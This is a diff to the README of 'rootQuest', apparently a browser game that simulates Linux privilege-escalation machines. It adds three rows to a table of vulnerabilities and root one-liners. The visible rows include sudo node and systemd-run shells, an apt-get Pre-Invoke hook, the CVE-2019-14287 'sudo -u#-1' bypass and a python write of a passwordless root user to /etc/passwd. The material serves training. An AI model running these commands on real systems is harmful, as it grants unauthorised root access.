@@ -1,6 +1,6 @@
 # rootQuest — Linux Privilege Escalation Playground
 
-A 100% browser-based, vanilla JS terminal game. 27 independent Linux machines, 27 different privilege-escalation vulnerabilities, sorted into difficulty tiers. Enumerate, identify, exploit, root.
+A 100% browser-based, vanilla JS terminal game. 30 independent Linux machines, 30 different privilege-escalation vulnerabilities, sorted into difficulty tiers. Enumerate, identify, exploit, root.
 
 ## Play
 
@@ -43,6 +43,9 @@ start index.html         # Windows
 | 25 | box-25 | Medium | Sudoers NOPASSWD on `node` (GTFOBins) | `sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'` |
 | 26 | box-26 | Medium | `sudoedit`/`sudo -e` with `EDITOR` kept in env_keep | Point `EDITOR` at your own executable, then `sudo EDITOR=/path/to/script -e /etc/motd` |
 | 27 | box-27 | Hard | Capability `cap_dac_override` on `python3` (write-DAC bypass) | `python3 -c "open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\n')"`, then `su pwnd` |
+| 28 | box-28 | Hard | `sudo` `(ALL, !root)` name-only exclusion bypassed by a negative uid (CVE-2019-14287) | `sudo -u#-1 /bin/bash` |
+| 29 | box-29 | Easy | Sudoers NOPASSWD on `systemd-run` — transient unit runs as root (GTFOBins) | `sudo systemd-run /bin/sh` |
+| 30 | box-30 | Medium | Sudoers NOPASSWD on `apt-get` — `-o` config-override runs a Pre-Invoke hook as root (GTFOBins) | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` |
 
 ## Controls
 
